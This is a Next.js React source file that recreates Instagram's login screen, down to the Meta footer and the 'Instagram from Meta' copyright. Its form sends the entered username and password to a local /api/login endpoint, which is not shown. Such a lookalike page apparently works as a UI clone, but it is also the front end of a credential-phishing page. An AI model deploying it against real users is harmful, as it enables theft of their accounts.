'use client'
import Image from "next/image";
import img from "../image/image.png";
import img1 from "../image/image1.png";
import google from "../image/google.png";
import ms from "../image/ms.png";
import { useState } from "react";

export default function Home() {
  const [user, setUser] = useState({
    username: "",
    password: "",
  });

  const handleInput = (e) => {
    const { name, value } = e.target;
    setUser((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "content-type": "application/json",
        },
        body: JSON.stringify(user),
      });

      const data = await response.json();
      if (data.success) {
         setUser({
           username: "",
           password: "",
         });
      }
    } catch (error) {
      console.log("Error:", error);
    } 
  };


  return (
    <main className="flex flex-col items-center justify-between py-14">
      <div className="flex gap-3">
        <div className="-mt-5">
          <Image
            src={img}
            className="w-[400px] h-[600px]"
            width={300}
            height={400}
          />
        </div>
        <div className="flex-1 flex items-center justify-center">
          <div className="h-screen flex flex-col items-center">
            <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
              <Image className="w-40" src={img1} width={200} height={300} />
              <form onSubmit={handleSubmit} className="mt-8 w-64 flex flex-col">
                <input
                  className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                  id="email"
                  placeholder="Phone number, username, or email"
                  type="text"
                  name="username"
                  value={user.username}
                  onChange={handleInput}
                />
                <input
                  className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
                  id="password"
                  placeholder="Password"
                  type="password"
                  name="password"
                  value={user.password}
                  onChange={handleInput}
                />
                <button type="submit" className=" text-sm text-center bg-[#4cb5f9] text-white py-2 rounded-lg font-medium">
                  Log In
                </button>
              </form>
              <div className="flex justify-evenly space-x-2 w-64 mt-4">
                <span className="bg-gray-300 h-px flex-grow t-2 relative top-2" />
                <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
                  or
                </span>
                <span className="bg-gray-300 h-px flex-grow t-2 relative top-2" />
              </div>
              <button className="mt-4 flex">
                <div className="bg-no-repeat facebook-logo mr-1" />
                <span className="text-xs text-blue-900 font-semibold">
                  Log in with Facebook
                </span>
              </button>
              <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
                Forgot password?
              </a>
            </div>
            <div className="bg-white border border-gray-300 text-center w-80 py-4">
              <span className="text-sm">Don&apos;t have an account?</span>
              <a className="text-blue-500 text-sm mx-1 font-semibold">
                Sign up
              </a>
            </div>
            <div className="mt-3 text-center">
              <span className="text-xs">Get the app</span>
              <div className="flex mt-3 space-x-2">
                <Image src={google} width={200} className="w-28" height={300} />
                <Image src={ms} width={200} className="w-28" height={300} />
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="-mt-36 p-4 text-sm text-gray-600">
        <div className="flex justify-center items-center">
          <p className="m-2">Meta</p>
          <p className="m-2">About</p>
          <p className="m-2">Blog</p>
          <p className="m-2">Jobs</p>
          <p className="m-2">Help</p>
          <p className="m-2">API</p>
          <p className="m-2">Privacy</p>
          <p className="m-2">Cookie Settings</p>
          <p className="m-2">Terms</p>
          <p className="m-2">Locations</p>
          <p className="m-2">Instagram Lite</p>
          <p className="m-2">Threads</p>
          <p className="m-2">Contact</p>
          <p className="m-2">Uploading & Non-Users</p>
          <p className="m-2">Meta Verified</p>
        </div>
        <div className="flex justify-center items-center">
          <p className="m-2">English </p>
          <p className="m-2">© 2024 Instagram from Meta</p>
        </div>
      </div>
    </main>
  );
}
